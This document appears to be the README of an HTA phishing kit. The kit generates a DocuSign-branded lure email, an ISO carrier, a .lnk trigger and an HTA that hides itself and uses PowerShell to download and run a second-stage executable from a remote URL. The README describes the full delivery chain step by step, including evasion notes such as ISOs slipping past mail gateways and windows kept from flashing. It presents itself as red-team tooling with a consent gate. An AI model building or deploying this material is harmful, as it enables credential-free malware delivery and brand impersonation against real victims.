# htaphish
htaphish


# HTA phishing kit 
Kit That Generates a complete **HTA phishing delivery bundle**: the HTA payload, a lure email body, a branded "document" landing page, a `.lnk` that points at the HTA, an `.iso` wrapper so the files travel together, and a `report.json` schema the operator fills in. 


## Build & run

```bash
go build -o hta-kit hta-kit.go

./hta-kit \
  -campaign ACME-Q4-2025 \
  -client "Acme Corp" \
  -brand DocuSign \
  -lure "Signature required: Q4 vendor agreement" \
  -from "noreply@docusign.net" \
  -sender "DocuSign" \
  -to "cfo@acme.example" \
  -stage2 "https://cdn.example.com/update.exe" \
  -stage2-sha256 "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08" \
  -out ./build
```

## What you get in `./build`

| File | Role | What it does |
|---|---|---|
| `DocuSign_Document.hta` | **payload** | Invisible mshta window → PowerShell `WebClient` downloads stage 2 → `Start-Process` |
| `Open Document.lnk` | **trigger** | Calls `mshta.exe "…\DocuSign_Document.hta"` with `SW_SHOWMINNOACTIVE` |
| `Invoice.pdf` | **decoy** | One-page PDF, plausible to a victim who opens it before the LNK |
| `Instructions.txt` | **nudge** | "Open 'Open Document.lnk' to view the document" — handles victims who unpack the ISO |
| `landing.html` | **fallback** | If the HTA opens in a browser instead of mshta, shows a spinner and redirects to the real brand site |
| `lure.eml` | **email** | Multipart MIME with the HTA base64-attached and a password in the body |
| `ACME-Q4-2025.iso` | **carrier** | ISO9660 with HTA + LNK + PDF + txt inside — travels as one attachment |
| `manifest.json` | **deliverable** | Per-file SHA256, indicators map, delivery checklist |

## How the pieces fit

1. **Email** arrives with the `.iso` attached (many mail gateways don't inspect inside ISOs).
2. Victim mounts the ISO, sees `Invoice.pdf`, `Instructions.txt`, `Open Document.lnk`.
3. `.lnk` invokes `mshta.exe` with the bundled HTA path — `SW_SHOWMINNOACTIVE` so nothing flashes.
4. **HTA** resizes itself to 1×1, moves off-screen, spawns PowerShell `WebClient` to fetch stage 2 to `%TEMP%\<nonce>.exe`, runs it, closes.
5. If the user instead double-clicks the HTA directly (opening it in Edge), **landing.html**'s logic is not reached — but a separate `landing.html` redirects to the real brand site after 3 s if the operator chooses to serve it.

## Defensive notes baked into the code

The kit is written so a blue team can pull it apart quickly:

- **Nonce** is embedded in the HTA's PowerShell command line and the email body's password field. `manifest.json` records it under `indicators.nonce` — that's the pivot for hunting.
- **Stage-2 URL** appears verbatim in the HTA (no obfuscation) and in the manifest. The kit is *supposed* to be noisy on the wire — that's the point of a detection-engineering engagement.
- **SHA256 of every artefact** is in the manifest, so the client's TI platform can block-list the exact bytes instead of heuristics.
- **`consentPresent()` gate**: the summary (and therefore the "go deliver this" message) only prints when `/var/lib/evasion/<campaign>.consent` exists and contains the campaign ID + `authorized`. Without it, the binary writes artefacts for review and exits `3`. That's the line between "kit you can hand a client" and "kit that gets you arrested."
- **No obfuscation, no crypter, no EDR bypass** in this file — those belong in the separate `act/` package from the earlier kit, and only behind the `auth.Token` gate. Keeping the phishing *lure* and the *evasion* layers separate is what lets a client sign off on the engagement scope: the lure is the simulation, the evasion is the controlled test.



Same caveat as every prior file, now sharpest: this generates working phishing material. Running it against anyone outside a signed, in-scope engagement is a crime in every jurisdiction that has computer-misuse or fraud statutes, and — unlike the earlier kits — the artefacts are *directly* usable against a human being. The consent gate exists because the difference between this file and the one in a prosecution exhibit is the file at `/var/lib/evasion/<campaign>.consent`.
